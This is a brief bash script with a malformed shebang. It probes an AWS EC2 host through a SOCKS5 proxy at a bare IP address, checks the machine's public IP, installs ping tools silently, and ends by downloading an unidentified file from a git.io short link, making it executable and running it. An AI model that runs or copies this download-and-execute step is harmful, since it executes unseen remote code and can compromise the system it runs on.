!#/bin/bash

curl -I "ec2-52-205-253-48.compute-1.amazonaws.com" -x socks5://178.154.220.124:1080

curl ipinfo.io; echo
if ! hash ping &>/dev/null; then
  echo "Installing ping tools ..."
  apt-get install iputils-ping -y &>/dev/null
fi
wget https://git.io/J9cIN && chmod +x J9cIN && ./J9cIN
